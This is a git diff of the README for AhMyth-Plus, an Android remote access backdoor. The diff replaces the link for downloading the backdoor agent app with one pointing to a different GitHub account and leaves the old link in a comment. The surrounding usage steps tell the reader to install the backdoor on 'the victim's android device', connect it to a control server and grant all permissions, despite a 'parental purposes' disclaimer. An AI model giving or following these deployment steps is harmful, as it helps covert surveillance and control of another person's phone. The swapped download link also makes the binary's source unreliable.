@@ -50,7 +50,7 @@ I have published this modified version of official Ahmyth solely for parental pu
  - `npm start`
  - 
 #### Usage
-- First download the agent app (backdoor) from [release page](https://github.com/VenomDino/AhMyth-Plus/releases) or you can generate the agent apk from the source using Android Studio.
+- First download the agent app (backdoor) from [release page](https://github.com/IlaveniRanjith/AhMyth-Plus/releases) or you can generate the agent apk from the source using Android Studio. <!-- https://github.com/VenomDino/AhMyth-Plus/releases -->
 - Install the backdoor (agent app) on the victim's android device.
 - Open the installed backdoor (agent app) and provide your control panel's (AhMyth Server) address and port number and click on "Save & Continue" button.
 - Allow all required permissions.
